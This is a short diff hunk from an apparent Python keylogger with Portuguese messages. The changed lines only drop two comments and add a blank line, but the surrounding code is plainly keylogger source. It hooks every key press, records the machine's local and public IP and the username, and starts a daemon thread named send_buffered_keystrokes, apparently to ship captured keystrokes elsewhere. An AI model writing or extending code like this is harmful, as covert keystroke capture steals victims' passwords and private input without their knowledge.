@@ -85,13 +85,12 @@ def on_press(key):
     except Exception as e:
         print("[ERRO ao processar tecla]", e)
 
-# Dados fixos
 local_ip = get_local_ip()
 public_ip = get_public_ip()
 username = getpass.getuser()
 
-# Iniciar thread e listener
 threading.Thread(target=send_buffered_keystrokes, daemon=True).start()
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
